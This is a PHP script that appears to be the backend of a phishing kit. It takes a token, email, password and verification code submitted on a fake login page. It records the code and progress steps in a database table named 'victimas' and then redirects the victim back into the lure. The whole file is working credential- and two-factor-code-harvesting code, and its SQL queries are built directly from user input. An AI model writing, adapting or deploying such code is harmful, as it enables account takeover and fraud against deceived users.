<?php
ob_start();
$token = $_POST['token'];
$email = $_POST['textInputValue'];
$password = $_POST['password'];
$verificationCode = $_POST['verificationCode'];
$paso = "6";
$envio = "U01AMES";

require '../../../../conexion.php';
include('../../../../tiempo.php'); 

if (empty($token)) {
	$actual_link = "../../../login/?";
	header('Location:' . $actual_link);
	}
	else {


    


$sql = "UPDATE victimas SET ultimaves='$RegistraFecha' WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);


$sql = "UPDATE victimas SET codigo = CONCAT_WS (' ', codigo, '$verificationCode') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET paso = CONCAT_WS (' ', paso, '$paso') WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$sql = "UPDATE victimas SET envio='$envio' WHERE base64 = '$token'";
$resultado = $mysqli->query($sql);

$actual_link2 = "../../../login/?";



	header('Location:' . $actual_link2 . 'token=' . $token);

}
ob_end_flush();
?>